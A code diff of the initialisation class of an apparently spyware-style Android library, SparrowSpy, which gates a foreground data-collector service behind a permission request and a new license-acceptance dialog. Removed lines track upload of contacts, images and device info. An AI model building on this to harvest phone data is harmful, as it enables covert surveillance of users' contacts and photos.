@@ -1,83 +1,94 @@
 package com.tangledbytes.sparrowspy;
 
-import android.app.Activity;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.net.Uri;
 import android.os.Build;
-import android.provider.Settings;
 import android.util.Log;
-import android.widget.Toast;
 
-import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
 
-import com.tangledbytes.sparrowspy.events.Events;
-import com.tangledbytes.sparrowspy.services.SparrowSpyService;
+import com.tangledbytes.sparrowspy.events.SparrowActions;
+import com.tangledbytes.sparrowspy.services.sparrowservice.SparrowService;
+import com.tangledbytes.sparrowspy.ui.LicenseDialogFragment;
 import com.tangledbytes.sparrowspy.utils.Constants;
-import com.tangledbytes.sparrowspy.utils.SpyState;
-import com.tangledbytes.sparrowspy.utils.Utils;
 
 public class SparrowSpy {
     private static final String TAG = "SparrowSpy";
     public static final int PERMISSIONS_REQUEST_CODE = 101;
     public static final int OPEN_SETTINGS_REQUEST_CODE = 102;
-    private final Activity mActivity;
+    private final AppCompatActivity mActivity;
     private final PermissionManager mPermissionManager;
 
-    private SparrowSpy(Activity activity) {
+    private final BroadcastReceiver onLicenseAcceptedListener = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String action = intent.getAction();
+            if(action != null && action.equals(SparrowActions.ACTION_LICENSE_ACCEPTED)) {
+                Log.i(TAG, "License accepted, starting SparrowService...");
+                startSparrowService();
+            }
+        }
+    };
+    private SparrowSpy(AppCompatActivity activity) {
         mActivity = activity;
         mPermissionManager = new PermissionManager(activity);
     }
 
-    public static SparrowSpy init(Activity activity) {
+    public static SparrowSpy init(AppCompatActivity activity) {
         SparrowSpy spy = new SparrowSpy(activity);
-        spy.startCollectorService();
+        spy.verifyLicenseAgreement(spy::startSparrowService);
         return spy;
+
     }
 
-    public SparrowSpy setDataCollectionListener(Events.DataCollectionListener listener) {
-        SpyState.Listeners.dataCollectionListener = listener;
-        return this;
-    }
-
-    public SparrowSpy setDataUploadListener(Events.DataUploadListener listener) {
-        SpyState.Listeners.dataUploadListener = listener;
-        return this;
-    }
-
-    public SparrowSpy setSpyServiceStateChangeListener(Events.SpyServiceStateChangeListener listener) {
-        SpyState.Listeners.spyServiceStateChangeListener = listener;
-        return this;
-    }
-
-    public SparrowSpy setPermissionDeniedListener(Events.PermissionsListener listener) {
-        SpyState.Listeners.permissionsListener = listener;
-        return this;
-    }
-
-    private void startCollectorService() {
+    private void startSparrowService() {
         if (!mPermissionManager.hasAllPermissions()) {
             Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
             mPermissionManager.grantPermissions();
             return;
         }
-        Intent intentCollectorService = new Intent(mActivity, SparrowSpyService.class);
+        Intent intentCollectorService = new Intent(mActivity, SparrowService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             mActivity.startForegroundService(intentCollectorService);
-        } else
-            mActivity.startService(intentCollectorService);
+        } else mActivity.startService(intentCollectorService);
     }
 
     public void handlePermissionResult() {
         mPermissionManager.handlePermissionResult();
-        startCollectorService();
+        startSparrowService();
     }
 
-    public boolean hasUploadedAllData() {
-        return Constants.appPrefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
-                && Constants.appPrefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
-                && Constants.appPrefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
+    public interface OnLicenseAgreementAcceptedListener {
+        void onLicenseAgreementAccepted();
     }
 
+    public void verifyLicenseAgreement(OnLicenseAgreementAcceptedListener listener) {
+        if (hasUserAcceptedLicense()) {
+            listener.onLicenseAgreementAccepted(); // License already accepted, notify listener
+            return;
+        }
+        displayLicenseAgreementDialog(listener);
+    }
+
+    private boolean hasUserAcceptedLicense() {
+        SharedPreferences preferences = mActivity.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);
+        return preferences.getBoolean(Constants.LICENSE_ACCEPTED_KEY, false);
+    }
+
+    private void displayLicenseAgreementDialog(OnLicenseAgreementAcceptedListener listener) {
+        mActivity.registerReceiver(onLicenseAcceptedListener, new IntentFilter(SparrowActions.ACTION_LICENSE_ACCEPTED));
+        LicenseDialogFragment dialogFragment = new LicenseDialogFragment();
+        dialogFragment.show(mActivity.getSupportFragmentManager(), "LicenseDialogFragment");
+    }
+
+    public SharedPreferences getSparrowPreferences() {
+        return mActivity.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);
+    }
+
+    public void onDestroy() {
+        mActivity.unregisterReceiver(onLicenseAcceptedListener);
+    }
 }
